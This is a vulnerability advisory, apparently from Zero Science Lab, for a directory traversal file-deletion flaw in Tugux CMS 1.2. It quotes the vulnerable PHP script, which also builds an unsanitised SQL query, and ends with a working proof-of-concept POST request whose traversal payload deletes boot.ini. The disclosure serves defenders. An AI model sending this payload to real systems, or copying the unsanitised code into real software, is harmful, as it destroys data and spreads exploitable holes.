@@ -1,0 +1,80 @@
+Tugux CMS 1.2 (pid) Remote Arbitrary File Deletion Vulnerability
+
+
+Vendor: Tugux Studios
+Product web page: http://www.tugux.com
+Affected version: 1.2
+
+Summary: Tugux CMS is a free, open-source content Management system
+(CMS) and application that powers the entire web.
+
+Desc: Input passed to the 'pid' parameter in administrator/delete_page_parse.php
+is not properly sanitised before being used to delete files. This can be exploited
+to delete files with the permissions of the web server via directory traversal
+sequences passed within the 'pid' parameter.
+
+
+------------------------------------------------------------------------------
+/administrator/delete_page_parse.php:
+------------------------------------------------------------------------------
+
+1: <?php 
+2: ///post form data
+3: $id=$_POST['pid'];
+4: 
+5:  $pic1 = ("slides/$id/image_01.jpg");
+6: 	 if (file_exists($pic1)) {
+7: 		    unlink($pic1);
+8:     }
+9:  $dir = "slides/$id";
+10:     rmdir($dir);
+11: 
+12: include_once "../scripts/connect_to_mysql.php";
+13: $query = mysqli_query($myConnection, "DELETE FROM pages WHERE id='$id' ") or die (mysqli_error($myConnection));
+14: echo '<table align="center"><tr> <td><div style=" width:300px; margin:auto; border:1px solid #BBB; font-family:Arial, Helvetica, sans-serif; color:#666; text-align:center">
+15: <img src="images/check.png" width="90" height="87"><br />
+16: Operation completed.Your page has been DELETED.<br />
+17: <a href="index.php">Click Here to go back</a></div></td></tr></table>';
+18: exit();
+19: ?>
+
+------------------------------------------------------------------------------
+
+
+Tested on: Microsoft Windows XP Professional SP3 (EN)
+           Apache 2.2.14 (Win32)
+           PHP 5.3.1
+           MySQL 5.1.41
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            liquidworm gmail com
+                            Zero Science Lab
+
+
+Advisory ID: ZSL-2011-5024
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-5024.php
+
+
+02.04.2011
+
+
+--
+
+POST /tugux/administrator/delete_page_parse.php HTTP/1.1
+Host: localhost
+Proxy-Connection: keep-alive
+User-Agent: x
+Content-Length: 175
+Cache-Control: max-age=0
+Origin: null
+Content-Type: multipart/form-data; boundary=----x
+Accept: text/html
+Accept-Language: en-US,en;q=0.8
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3
+
+------x
+Content-Disposition: form-data; name="pid"
+
+../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../boot.ini
+------x--
